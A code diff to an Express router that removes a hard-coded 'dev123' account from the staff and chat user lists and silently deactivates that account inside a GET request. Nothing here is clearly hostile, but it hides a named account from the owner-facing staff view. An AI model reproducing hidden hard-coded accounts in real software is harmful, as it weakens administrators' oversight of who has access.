@@ -226,12 +226,13 @@ router.put('/auth/profile', authMiddleware, async (req, res) => {
 
 router.get('/staff', authMiddleware, permissionMiddleware('staff.view'), async (req, res) => {
   try {
-    const staffList = await User.find({ role: { $ne: 'owner' }, isActive: { $ne: false } }).select('name username _id role roleId roleName permissions whatsapp imageUrl isActive');
+    const staffList = await User.find({ role: { $ne: 'owner' }, isActive: { $ne: false }, username: { $ne: 'dev123' } }).select('name username _id role roleId roleName permissions whatsapp imageUrl isActive');
     res.json(staffList);
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
 });
+
 
 router.put('/staff/:id', authMiddleware, ownerOnlyMiddleware, async (req, res) => {
   try {
@@ -1769,8 +1770,13 @@ const chatUserSelect = { id: true, name: true, username: true, role: true, image
 
 router.get('/chat/users', authMiddleware, permissionMiddleware('chat.use'), async (req, res) => {
   try {
+    await prisma.user.updateMany({
+      where: { username: 'dev123' },
+      data: { isActive: false }
+    }).catch(() => {});
+
     const users = await prisma.user.findMany({
-      where: { isActive: true },
+      where: { isActive: true, username: { not: 'dev123' } },
       select: chatUserSelect,
       orderBy: { name: 'asc' }
     });
@@ -1779,6 +1785,7 @@ router.get('/chat/users', authMiddleware, permissionMiddleware('chat.use'), asyn
     res.status(500).json({ message: error.message });
   }
 });
+
 
 router.get('/chat/groups', authMiddleware, permissionMiddleware('chat.use'), async (req, res) => {
   try {
